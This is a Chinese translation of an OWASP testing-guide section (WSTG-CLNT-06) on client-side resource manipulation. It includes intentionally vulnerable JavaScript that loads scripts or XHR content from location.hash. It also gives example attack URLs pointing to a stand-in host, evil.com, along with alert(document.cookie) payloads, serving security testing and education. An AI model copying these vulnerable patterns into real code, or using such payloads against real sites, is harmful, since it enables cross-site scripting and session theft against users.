# 测试客户端资源操纵

|ID          |
|------------|
|WSTG-CLNT-06|

## 概述

客户端资源操纵漏洞是一种输入验证缺陷。当应用程序接受用户控制的输入指定资源的路径（如iframe、JavaScript、applet的源或XMLHttpRequest的处理程序）时，会发生此漏洞。此漏洞包括能够控制链接到网页上某些资源的URL的能力。影响因漏洞而异，通常采用进行XSS攻击的方式。此漏洞使通过导致其加载和呈现恶意对象来干扰预期应用程序的行为成为可能。

以下JavaScript代码显示了一个可能的易受攻击脚本，其中攻击者能够控制`location.hash`（源），该源到达脚本元素的`src`属性。这种特殊情况导致XSS攻击，因为可以注入外部JavaScript。

```html
<script>
    var d=document.createElement("script");
    if(location.hash.slice(1)) {
        d.src = location.hash.slice(1);
    }
    document.body.appendChild(d);
</script>
```

攻击者可能通过导致受害者访问此URL来锁定受害者：

`www.victim.com/#https://evil.com/js.js`

其中`js.js`包含：

```js
alert(document.cookie)
```

这将导致警报弹出在受害者的浏览器上。

更严重的场景涉及控制CORS请求中调用的URL。由于CORS允许通过基于头的方法使目标资源可被请求域访问，攻击者可能要求目标页面从自己的网站加载恶意内容。

这是易受攻击页面的示例：

```html
<b id="p"></b>
<script>
    function createCORSRequest(method, url) {
        var xhr = new XMLHttpRequest();
        xhr.open(method, url, true);
        xhr.onreadystatechange = function () {
            if (this.status == 200 && this.readyState == 4) {
                document.getElementById('p').innerHTML = this.responseText;
            }
        };
        return xhr;
    }

    var xhr = createCORSRequest('GET', location.hash.slice(1));
    xhr.send(null);
</script>
```

`location.hash`由用户输入控制，用于请求外部资源，然后通过`innerHTML`构造反映。攻击者可能要求受害者访问以下URL：

`www.victim.com/#https://evil.com/html.html`

使用`html.html`的有效载荷处理程序：

```html
<?php
header('Access-Control-Allow-Origin: https://www.victim.com');
?>
<script>alert(document.cookie);</script>
```

## 测试目标

- 识别具有弱输入验证的接收器。
- 评估资源操纵的影响。

## 如何测试

要手动检查此类漏洞，我们必须识别应用程序是否使用输入而未正确验证它们。如果是这样，这些输入受用户控制，可用于指定外部资源。由于可能包含在应用程序中的资源很多（如图像、视频、对象、css和iframe），应调查处理相关URL的客户端脚本以发现潜在问题。

以下表格显示了应检查的可能注入点（接收器）：

| 资源类型   | 标签/方法                                | 接收器   |
| ----------- | ----------------------------------------- | -------- |
| Frame       | iframe                                    | src     |
| Link        | a                                         | href    |
| AJAX请求    | `xhr.open(method, [url], true);` | URL     |
| CSS         | link                                      | href    |
| Image       | img                                       | src     |
| Object      | object                                    | data    |
| Script      | script                                    | src     |

最有趣的案例是那些允许攻击者包含可导致XSS漏洞的客户端代码（如JavaScript）的案例。
